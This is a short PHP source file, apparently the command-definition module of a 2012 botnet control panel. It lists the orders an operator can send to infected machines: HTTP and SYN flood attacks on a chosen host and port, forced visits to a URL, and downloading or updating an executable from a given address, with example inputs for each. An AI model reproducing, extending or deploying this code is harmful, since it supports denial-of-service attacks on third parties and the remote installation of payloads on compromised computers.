<?php
	/* Copyright © 2012 by Chrystal */
	
	if(!defined('__CP__')) { die(); }
	
	$Commands = array(
		'HTTP Flood' => 'Host*Port*Path<br />For example: server.com*80*/',
		'SYN Flood' => 'Host*Port<br />For example: server.com*80',
		'Visit' => 'Web Address<br />For example: http://www.server.com/',
		'Download' => 'File Address<br />For example: http://www.server.com/file.exe',
		'Update' => 'File Address<br />For example: http://www.server.com/file.exe',
		);
	
	$CTypeList = array(
		'Update' => 2,
		'Download' => 3,
		'Visit' => 4,
		'SYN Flood' => 5,
		'HTTP Flood' => 6
		);
?>